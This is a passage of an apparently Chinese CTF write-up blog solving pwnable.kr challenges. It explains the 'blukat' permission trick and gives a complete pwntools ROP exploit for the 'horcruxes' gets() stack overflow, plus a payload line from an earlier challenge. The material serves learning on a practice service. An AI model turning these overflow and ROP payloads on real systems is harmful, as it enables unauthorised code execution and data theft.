</code></pre><p>根据刚才得到的栈上关系，<code>ebp-0x8 = stack address leak + 0xc</code>，因此第二种方法的 payload：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>shell_addr</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>12</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>stack_leak</span><span class=o>+</span><span class=mh>0xc</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>heap_leak</span><span class=o>+</span><span class=mh>0xc</span><span class=p>)</span>
</span></span></code></pre></div><h2 id=blukat class="relative group">blukat <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#blukat aria-label=锚点>#</a></span></h2><p>这题只有三分，但是代码中并没有什么可利用的点：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>char</span> <span class=n>flag</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>password</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kt>char</span><span class=o>*</span> <span class=n>key</span> <span class=o>=</span> <span class=s>&#34;3</span><span class=se>\r</span><span class=s>G[S/%</span><span class=se>\x1c\x1d</span><span class=s>#0?</span><span class=se>\r</span><span class=s>IS</span><span class=se>\x0f\x1c\x1d\x18</span><span class=s>;,4</span><span class=se>\x1b\x00\x1b</span><span class=s>p;5</span><span class=se>\x0b\x1b\x08\x45</span><span class=s>+&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>calc_flag</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>s</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=nf>strlen</span><span class=p>(</span><span class=n>s</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>key</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=n>FILE</span><span class=o>*</span> <span class=n>fp</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;/home/blukat/password&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=mi>100</span><span class=p>,</span> <span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;guess the password!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>buf</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;congrats! here is your flag:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>calc_flag</span><span class=p>(</span><span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;wrong guess!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>这里就是要求输入 <code>password</code> 并和同目录的 <code>password</code> 文件比对，相同则输出 flag。直接 <code>cat password</code>，显示无权限：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat: password: Permission denied
</span></span></code></pre></div><p>由于没有可利用的点并且分很低，结合提示可以想到不是常规思路能解决的题。注意到 <code>blukat.c</code> 这个程序明显是可以读 <code>password</code> 文件的，我们可以查看一下该文件的权限：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ls -al
</span></span><span class=line><span class=cl>total <span class=m>36</span>
</span></span><span class=line><span class=cl>drwxr-x---   <span class=m>4</span> root blukat     <span class=m>4096</span> Aug <span class=m>16</span>  <span class=m>2018</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>114</span> root root       <span class=m>4096</span> May <span class=m>19</span> 15:59 ..
</span></span><span class=line><span class=cl>-r-xr-sr-x   <span class=m>1</span> root blukat_pwn <span class=m>9144</span> Aug  <span class=m>8</span>  <span class=m>2018</span> blukat
</span></span><span class=line><span class=cl>-rw-r--r--   <span class=m>1</span> root root        <span class=m>645</span> Aug  <span class=m>8</span>  <span class=m>2018</span> blukat.c
</span></span><span class=line><span class=cl>dr-xr-xr-x   <span class=m>2</span> root root       <span class=m>4096</span> Aug <span class=m>16</span>  <span class=m>2018</span> .irssi
</span></span><span class=line><span class=cl>-rw-r-----   <span class=m>1</span> root blukat_pwn   <span class=m>33</span> Jan  <span class=m>6</span>  <span class=m>2017</span> password
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root       <span class=m>4096</span> Aug <span class=m>16</span>  <span class=m>2018</span> .pwntools-cache
</span></span></code></pre></div><p>需要是 <code>blukat_pwn</code> 组的用户才能够读，那么我们是以什么用户登录的呢？</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1104<span class=o>(</span>blukat<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1104<span class=o>(</span>blukat<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1104<span class=o>(</span>blukat<span class=o>)</span>,1105<span class=o>(</span>blukat_pwn<span class=o>)</span>
</span></span></code></pre></div><p>可以看到我们确实是属于 <code>blukat_pwn</code> 组的，但是却提示无权读取，那么只有一种可能，就是 <code>password</code> 文件本身的内容就是：</p><pre tabindex=0><code>cat: password: Permission denied
</code></pre><p>输入进程序就能得到 flag。</p><h2 id=horcruxes class="relative group">horcruxes <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#horcruxes aria-label=锚点>#</a></span></h2><p>IDA 一下 <code>ropme</code> 函数：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>ropme</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span> <span class=c1>// [esp+4h] [ebp-74h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [esp+68h] [ebp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// [esp+6Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Select Menu:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>getchar</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>A</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>B</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>C</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>D</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>E</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>F</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>v2</span> <span class=o>==</span> <span class=n>g</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>G</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;How many EXP did you earned? :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>gets</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>atoi</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>==</span> <span class=n>sum</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;flag&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>s</span><span class=p>[</span><span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=mh>0x64u</span><span class=p>)]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;You&#39;d better get more experience to kill Voldemort&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>显然最后一个 <code>else</code> 部分的 <code>gets</code> 可以导致栈溢出，但是程序开启了 NX 使得无法在栈上执行 <code>shellcode</code>，根据题目提示，这题我们需要利用 ROP 技术找到 7 个 <code>gadgets</code>，最终劫持返回地址。</p><p>根据 IDA 提示，<code>s</code> 位于 <code>ebp-0x74</code> 与返回地址相差 <code>0x74+0x4=0x78</code>。注意到 <code>ropme</code> 函数的地址 <code>0x080a0009</code> 中含有 <code>0a</code> 这个截断字符，因此我们不可能将其中的地址写到栈上，也就是说不能绕过 <code>if (atoi(s) == sum )</code> 直接去读 flag。那我们就需要找到 <code>sum</code>：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>int</span> <span class=nf>init_ABCDEFG</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>v0</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>buf</span><span class=p>;</span> <span class=c1>// [esp+8h] [ebp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// [esp+Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/urandom&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>buf</span><span class=p>,</span> <span class=mi>4u</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>4</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;/dev/urandom error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>srand</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>a</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=nf>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>b</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=nf>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>c</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=nf>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>d</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=nf>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>e</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=nf>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>f</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=nf>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v0</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>g</span> <span class=o>=</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=n>v0</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=n>f</span> <span class=o>+</span> <span class=n>e</span> <span class=o>+</span> <span class=n>d</span> <span class=o>+</span> <span class=n>c</span> <span class=o>+</span> <span class=n>b</span> <span class=o>+</span> <span class=n>a</span> <span class=o>+</span> <span class=o>-</span><span class=mi>559038737</span> <span class=o>*</span> <span class=n>v0</span> <span class=o>%</span> <span class=mh>0xCAFEBABE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>sum</span> <span class=o>=</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>由于调用了 <code>srand</code>，我们无法预测 <code>abcdefg</code> 的值，但是我们又需要它们的值才能计算出 <code>sum</code>。幸运的是，在 <code>ropme</code> 函数中刚才被我们忽略的上面的一大串 <code>if</code> 语句能带来一些帮助。当输入的 <code>v2</code> 等于这些随机数中的任一个时，就会执行相应的大写字母作为名字的函数，而这些函数会将随机数本身打印出来，这样我们就能拿到 7 个随机数的值了，相加就能得到 <code>sum</code>。</p><p>我们从 IDA 中拿到 7 个函数的地址，前面先填充 <code>0x78</code> 字节，随后依次追加 7 个函数的地址，那么一个函数返回后就会返回到下一个函数的入口上，构成 ROP 链，最后再返回 <code>ropme</code> 计算 <code>sum</code>。然而前面提到 <code>ropme</code> 地址无法写到栈上，但我们可以利用 <code>main</code> 函数中 <code>call ropme</code> 所在地址 <code>0x0809fffc</code>，来返回到 <code>ropme</code>。</p><p>因此，最终 payload 为：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;pwnable.kr&#39;</span><span class=p>,</span> <span class=mi>9032</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x78</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fe4b</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fe6a</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fe89</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fea8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fec7</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fee6</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809ff05</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x0809fffc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>sum</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;+&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>sum</span> <span class=o>+=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>2</span><span class=p>])</span> <span class=c1># strip )\n</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>sum</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span></code></pre></div></div></section><footer class="pt-8 max-w-prose print:hidden"><div class=flex><img class="w-24 h-24 !mt-0 !mb-0 ltr:mr-4 rtl:ml-4 rounded-full" width=96 height=96 alt=Mercury src=/my_avatar_huffcabec77dc887387e1e045311cbdc8b_49733_192x192_fill_box_smart1_3.png><div class=place-self-center><div class="text-[0.6rem] leading-3 text-neutral-500 dark:text-neutral-400 uppercase">作者</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">Mercury</div><div class="text-sm text-neutral-700 dark:text-neutral-400">A student</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=mailto:signormercurio@gmail.com target=_blank aria-label=Email rel="me noopener noreferrer"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1-27.64 140.9 68.65 266.2 199.1 285.1 19.01 2.888 36.17-12.26 36.17-31.49l1e-4-.6631c0-15.74-11.44-28.88-26.84-31.24-84.35-12.98-149.2-86.13-149.2-174.2.0-102.9 88.61-185.5 193.4-175.4 91.54 8.869 158.6 91.25 158.6 183.2v16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98.0036c-7.299.0-13.2 4.992-15.12 11.68-24.85-12.15-54.24-16.38-86.06-5.106-38.75 13.73-68.12 48.91-73.72 89.64-9.483 69.01 43.81 128 110.9 128 26.44.0 50.43-9.544 69.59-24.88 24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3c0-149.2-133.9-265.632-287.3-235.57zM239.1 304.3c-26.47.0-48-21.56-48-48.05s21.53-48.05 48-48.05 48 21.56 48 48.05-20.6 48.05-48 48.05z"/></svg></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/SignorMercurio target=_blank aria-label=Github rel="me noopener noreferrer"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://t.me/m9r_at_tG target=_blank aria-label=Telegram rel="me noopener noreferrer"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M248 8C111.033 8 0 119.033.0 256S111.033 504 248 504 496 392.967 496 256 384.967 8 248 8zM362.952 176.66c-3.732 39.215-19.881 134.378-28.1 178.3-3.476 18.584-10.322 24.816-16.948 25.425-14.4 1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25 5.342-39.5 3.652-3.793 67.107-61.51 